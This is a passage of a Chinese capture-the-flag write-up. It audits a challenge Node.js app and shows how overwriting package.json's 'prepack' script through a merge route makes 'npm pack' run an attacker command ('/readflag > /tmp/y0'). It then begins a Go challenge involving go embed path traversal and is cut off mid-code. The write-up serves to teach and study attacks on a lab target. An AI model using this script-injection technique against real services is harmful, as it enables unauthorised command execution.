class="string">&quot;/Upload&quot;</span>,upload.<span class="title function_">any</span>(),<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;upload&quot;</span>,&#123;<span class="attr">upload_result</span>:<span class="string">&quot;plz upload file&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">files</span> || <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;No files were uploaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> file = req.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> fileData = fs.<span class="title function_">readFileSync</span>(file.<span class="property">path</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(fileData))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File data invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload/&quot;</span>,file.<span class="property">originalname</span>);</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>) === <span class="string">&quot;.json&quot;</span>) &#123;</span><br><span class="line">            fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload error&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload success&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Not a JSON file&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set dependencies</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pack dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kill installing dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/KillDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Killing dependencies...&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;ps -ef | grep npm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logout</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Logout&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_login</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_admin</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就开始审计代码了，可以看网页上路由的代码了 </p><p><code>// Set dependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里由于这个post值可控，于是data就可控</p><p><img src="../images/image-20230504195748835.png" alt="image-20230504195748835"></p><p><img src="../images/image-20230504195839820.png" alt="image-20230504195839820"></p><p>这段代码定义了一个 JavaScript 对象 <code>exampleJson</code>，表示一个 Node.js 应用程序的 <strong>package.json</strong> 文件内容。这个对象包含了应用程序的名称、版本、描述、作者、脚本、许可证和依赖项等信息。</p><p><code>Object.assign</code> 方法用于将新的属性值合并到现有对象中。这里，我们将空对象 <code>&#123;&#125;</code> 作为第二个参数传递给 <code>Object.assign</code>，因此不会修改现有对象 <code>exampleJson</code>，而是返回一个新对象，该对象包含 <code>exampleJson</code> 的所有属性以及在 <code>data</code> 对象中定义的任何新属性。</p><p>如果 <code>data</code> 对象中定义了与 <code>exampleJson</code> 中相同的属性，则将覆盖原有属性。因此，可以通过 <code>Object.assign</code> 方法来修改或更新现有对象的属性。<strong>在这个例子中，我们使用 <code>Object.assign</code> 来将 <code>data</code> 对象的属性值合并到 <code>exampleJson</code> 对象中，实现了更新 package.json 文件内容的目的。</strong></p><p><code>//PackDependencies</code>路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里面的有个执行函数，他的意思是</p><p><code>cp.exec(&quot;cd &quot; + filePath + &quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;,(err,stdout,stderr) =&gt; &#123;</code> <code>npm pack</code>就相当与重新加载里面的json数据会变成我们改变过的，然后exec执行</p><p><img src="../images/image-20230504200640051.png" alt="image-20230504200640051"></p><p>接下来我们就可以使用临时文件来替换这个代码，因为临时目录下文件权限较高</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exampleJson = </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line"><span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line"><span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;/readflag &gt; /tmp/y0&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后最后通过show路由就可以成功进行文件查看了</p><p><img src="../images/image-20230504201002030.png" alt="image-20230504201002030"></p><p>先去  <code>url/dashboardIndex/SetDependencies</code>  这个网址来进行<strong>package.json</strong>内容的修改</p><p><img src="../images/image-20230504205510103.png" alt="image-20230504205510103"></p><p><strong>这里是别忘改了，不然上传不成功</strong></p><p>然后去<code>url/dashboardIndex/PackDependencies</code>路由进行npm pack 重新加载json数据，然后进行exec数据的执行</p><p><img src="../images/image-20230504202007954.png" alt="image-20230504202007954"></p><p>然后去<code>url/dashboardIndex/ShowExampleFile</code>路由进行文件的读取</p><p><img src="../images/image-20230504205542586.png" alt="image-20230504205542586"></p><p>成功</p><p><strong>这里考察的nosql的MongoDB盲注，app黑名单绕过，nodejs代码审计，npm pack的重新加载</strong></p><p>这道题能学到挺多东西的</p><h2 id="d3go"><a href="#d3go" class="headerlink" title="d3go"></a>d3go</h2><p><strong>bs是go编程语言的新手，最近发现新特性“go embed”很有意思。他写了一个在线解压服务，使用go embed打包静态资源文件。您的任务是利用此应用程序的漏洞，对其进行 RCE 并获取标志。</strong></p><p><strong>一开始会显示ERR_EMPTY_RESPONSE，请稍候刷新！</strong></p><p><strong>提示：</strong></p><p><strong>d3go 的Gamebox 无法连接到Internet。</strong></p><p>题目</p><p><img src="../images/image-20230505192100368.png" alt="image-20230505192100368"></p><p><code>go embed</code> 的错误使用导致源代码被打包到程序中。</p><p>这与不正确的静态文件服务相结合，导致/../路径列表⽬录以获取源代码。</p><p><img src="../images/image-20230505192841822.png" alt="image-20230505192841822"></p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/controller&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/middleware&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr:    <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Handler: r,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span 